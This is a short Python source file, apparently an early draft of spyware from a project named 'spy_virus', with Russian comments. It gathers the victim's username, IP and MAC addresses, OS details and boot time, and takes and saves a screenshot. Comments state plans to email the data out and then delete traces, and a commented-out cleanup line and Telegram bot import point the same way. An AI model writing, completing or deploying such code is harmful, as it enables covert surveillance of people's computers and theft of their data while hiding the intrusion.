import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
import speedtest
#import telebot
import psutil
import platform
from PIL import Image


name = getpass.getuser()    # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn())   # IP-адрес системы
mac = get_mac()   # MAC адрес
ost = platform.uname()    # Название операционной системы
#print(name, ip, mac, ost)
print(f'PC username: {name} \nIP {ip} \nMac adress: {mac} \nOS system: \t{ost}')

zone = psutil.boot_time()   # Узнает время, заданное на компьютере
time = datetime.fromtimestamp(zone)   # Переводит данные в читаемый вид
print("Current time:",time)

# cpu = psutil.cpu_freq()
# print("cpu",cpu)
# print('\n\n\n\n\n\n')
# for key , values in os.environ.items():
#     print(key,":", values)

myScreenshot = pyautogui.screenshot()       # делаем скриншот
myScreenshot.save(r'/home/hacking/PycharmProjects/spy_virus/screenshot_1.png')     # сохраняем его  хочу сразу отправлять инфу на почту, потом чистить следы
#os.remove('/home/hacking/PycharmProjects/spy_virus/screenshot_1.png') чистка следов, тоже самое сделать с файлом в который будет запись, не забыть